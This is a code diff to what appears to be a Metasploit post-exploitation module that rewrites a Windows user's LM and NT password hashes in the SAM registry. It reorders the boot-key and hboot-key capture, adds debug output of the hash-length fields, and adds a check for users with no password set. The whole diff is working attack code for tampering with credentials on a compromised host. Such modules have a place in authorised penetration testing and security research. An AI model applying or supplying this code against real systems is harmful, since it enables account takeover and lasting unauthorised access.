@@ -56,16 +56,16 @@ class MetasploitModule < Msf::Post
             end
             print_line("LM Hash: "+lmhash)
             print_line("NT Hash: "+nthash)
-            print_status("Obtaining the boot key...")
-            bootkey  = capture_boot_key
-            print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
-            hbootkey = capture_hboot_key(bootkey)
             print_status("Searching for user")
             ridInt    = get_user_id(username)
             rid = '%08x' % ridInt
             print_line("User found with id: " + rid)
             print_status("Loading user key")
             user    = get_user_key(rid)
+            print_status("Obtaining the boot key...")
+            bootkey  = capture_boot_key
+            print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
+            hbootkey = capture_hboot_key(bootkey)
             print_status("Modifying user key")
             modify_user_key(hbootkey, ridInt, user,[nthash].pack("H*"),[lmhash].pack("H*"))
             print_status("Carving user key")
@@ -126,7 +126,12 @@ class MetasploitModule < Msf::Post
         hoff = user[0x9c, 4].unpack("V")[0] + 0xcc
         #Check if hashes exist (if 20, then we've got a hash)
         lm_exists = user[0x9c+4,4].unpack("V")[0] == 20 ? true : false
+        print_status('%08x' % user[0x9c+4,4].unpack("V")[0])
         nt_exists = user[0x9c+16,4].unpack("V")[0] == 20 ? true : false
+        print_status('%08x' % user[0x9c+16,4].unpack("V")[0])
+        if !lm_exists and !nt_exists
+            raise 'No password is currently set for the user'
+        end
         print_status("Modifiying LM hash")
         if lm_exists
             user[hoff + 4, 16] = encrypt_user_hash(rid, hbootkey, lmhash, @sam_lmpass)
